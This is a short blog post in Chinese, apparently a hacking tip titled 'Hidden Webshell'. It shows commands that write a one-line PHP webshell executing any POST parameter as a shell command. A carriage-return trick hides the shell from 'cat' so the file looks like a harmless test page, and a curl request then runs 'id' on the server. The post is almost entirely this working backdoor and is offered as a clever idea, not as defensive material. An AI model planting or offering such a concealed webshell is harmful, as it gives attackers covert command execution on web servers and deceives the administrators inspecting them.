---
layout:     post
title:      隐藏Webshell
subtitle:   骚思路
date:       2019-04-26
author:     BugMan
header-img: img/post-bg-hacker.jpg
catalog: true
tags:
    - Webshell
    - PHP
---
# 隐藏Webshell

```
$ sudo echo -e "<?=\`\$_POST[1]\`?>\r<?='PHP Test';?>" > test.php
$ cat test.php
<?='PHP Test';?>
$ curl localhost/test.php -d 1=id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
PHP Test
```
